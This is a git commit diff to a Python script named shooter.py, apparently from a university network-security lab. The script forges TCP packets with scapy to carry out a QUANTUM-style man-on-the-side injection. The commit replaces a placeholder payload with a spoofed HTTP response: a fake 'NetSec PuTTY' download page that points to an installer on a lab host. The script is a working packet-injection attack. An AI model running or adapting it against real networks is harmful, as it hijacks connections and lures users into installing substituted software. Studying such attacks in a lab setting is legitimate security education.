d1b4c3053c032dd14a882978b381840460ee349f
Van Thong Nguyen <tom@gridscale.io>
2021-05-04 14:32:49 +0200

    test

--- shooter.py
+++ shooter.py
@@ -26,14 +26,14 @@ REGEX_SYNACK = re.compile(
     "([\d\.]+)\.(\d+) > ([\d\.]+)\.(\d+): Flags.*seq (\d+), ack (\d+)")
 
 
-PAYLOAD_PUTTY_BODY = 'hehehehhahahah\r\n'
+PAYLOAD_PUTTY_BODY = '<!doctype html>\r\n<html lang="en">\r\n<head>\r\n  <meta charset="utf-8">\r\n  <title>NetSec PuTTY download</title>\r\n</head>\r\n\r\n<body>\r\n  <h1>NetSec PuTTY Client Download</h1>\r\n  <p>Download our secure PuTTY client here:</p>\r\n  <p id="putty_download"><a href="http://cantillon.netsec.seclab-bonn.de/putty-64bit-0.71-installer.msi">putty-64bit-0.71-installer.msi</a> (SHA-256: TEST)</p>\r\n  <p>Do not forget to verify the hash after downloading the installer!</p>\r\n</body>\r\n</html>\r\n'
 PAYLOAD_PUTTY_HEADER = 'HTTP/1.1 200 OK\r\nServer: nginx\r\nDate: Mon, 03 May 2021 18:16:19 GMT\r\nContent-Type: text/html\r\nLast-Modified: Wed, 14 Apr 2021 14:47:45 GMT\r\nConnection: keep-alive\r\nETag: W/"60770091-208"\r\n\r\n'
 PAYLOAD_PUTTY = PAYLOAD_PUTTY_HEADER + PAYLOAD_PUTTY_BODY
 
 
 def main():
     print('Ready to QUANTUM INJECT HAHAHA')
-    conf.L3socket=L3RawSocket
+    conf.L3socket = L3RawSocket
     while True:
         line = sys.stdin.readline()
         print("LOG: ", line.strip())
@@ -44,7 +44,8 @@ def main():
                                        seq=int(seq)+1, ack=int(ack), flags="PA") / payload
         send(p)
         print('Sending: %r' % p)
-        p = IP(src=src, dst=dst) / TCP(sport=int(sport), dport=int(dport), seq=int(seq)+len(payload)+1, ack=int(ack), flags="FA")
+        p = IP(src=src, dst=dst) / TCP(sport=int(sport), dport=int(dport),
+                                       seq=int(seq)+len(payload)+1, ack=int(ack), flags="FA")
         send(p)
         print('Sending: %r' % p)
 
